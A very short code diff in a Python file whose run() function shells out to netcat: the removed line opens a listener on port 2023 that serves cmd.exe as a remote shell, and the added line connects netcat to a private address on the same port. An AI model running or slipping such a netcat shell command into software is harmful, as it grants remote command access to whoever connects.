@@ -1,4 +1,4 @@
 import os
 def run():
-   os.system("nc -v -n -l -p 2023 -e cmd.exe")
+   os.system("nc -n -v 192.168.217.1 2023")
    
